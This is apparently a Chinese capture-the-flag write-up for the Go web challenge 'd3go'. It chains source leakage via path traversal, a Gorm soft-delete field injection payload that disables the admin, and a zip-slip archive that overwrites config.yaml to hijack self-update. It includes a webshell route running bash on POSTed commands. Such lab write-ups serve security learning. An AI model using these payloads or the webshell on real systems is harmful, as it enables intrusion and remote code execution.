# d3go

## 题目简述

题目是 Go Web 应用审计。由于 `go embed *` 和静态文件服务配置错误，可以目录穿越拿到源码；源码中注册接口把 JSON 绑定结果直接 `db.Save()`，可注入 Gorm 软删除字段让原 admin 失效；随后利用 zip 解压目录穿越覆盖 `config.yaml`，把 self-update 更新源改成本地上传的恶意二进制，从而热更新成带 `/shell` 路由的后门程序。

## 解题过程

### 通过目录穿越导出源码

`go embed *` 使用不当，导致源码被一起打包进程序。

再结合错误的静态文件服务配置，可以通过 `/../` 路径列目录并获取源码。

### Gorm 软删除注入

审计代码后发现：

1. 管理员账号是数据库中的第一个用户，并且当前无法登录。

2. 对于 `/register` API，`controller` 使用 `c.ShouldBindJSON()` 绑定 JSON，`db` 层又把绑定后的变量直接通过 `db.Save()` 写入数据库。

因此可以构造如下 payload 注入 `deletedat` 字段，让原始 `admin` 被软删除。

```
{"id":1,"deletedat":"2011-01-01T11:11:11Z","createdat":"2011-01-01T11:11:11Z"}
```

注意 `createdat` 字段类型是 `datetime`。如果该字段留空，会向 MySQL 更新 `0000` - `00` - `00 00:00:00`，这不在 `datetime` 的合法范围内，所以需要手动指定。

### 解压覆盖配置文件，通过自更新完成 RCE

继续审计代码可以发现：

1. unzip 功能没有检查目录穿越，可以通过目录穿越写任意文件。

2. self-update 的 URL 由配置文件控制，支持热更新。

3. `unzipped` 目录中的文件会被静态服务暴露。

因此可以构造如下 zip 包：

``` ..
|- ..
  |- config.yaml
|- exp
```

### config.yaml

```
server:
  noAdminLogin: true
database:
  user: root
  password: root
  host: 127.0.0.1
  port: 3306
update:
  enabled: true
  url: http://127.0.0.1:8080/unzipped/exp
  interval: 1
```

### exp 的部分源码

```
r.POST("/shell", func(c *gin.Context) {
        output, err := exec.Command("/bin/bash", "-c",
c.PostForm("cmd")).CombinedOutput()
        if err != nil {
            c.String(500, err.Error())
        }
        c.String(200, string(output))
    })
```

在导出的源码中添加 webshell，并构建为 `exp`。

`config.yaml` 会覆盖原始配置，并在约一分钟后触发自更新，更新到我们上传的 `exp` 文件。

成功获取 shell 后，flag 位于根目录。

## 方法总结

- 核心技巧：Go embed 源码泄露、Gorm soft delete 字段注入、zip slip 覆盖配置、自更新功能劫持。
- 识别信号：Go 程序把静态文件、embed、`/../` 路由和源码目录混在一起时，先尝试目录穿越；Gorm 模型如果允许用户控制 `id/deletedat/createdat`，就能影响软删除状态。
- 复用要点：自更新功能通常信任配置文件中的 URL，若又存在任意文件写或配置覆盖，就可以把更新机制变成稳定 RCE。
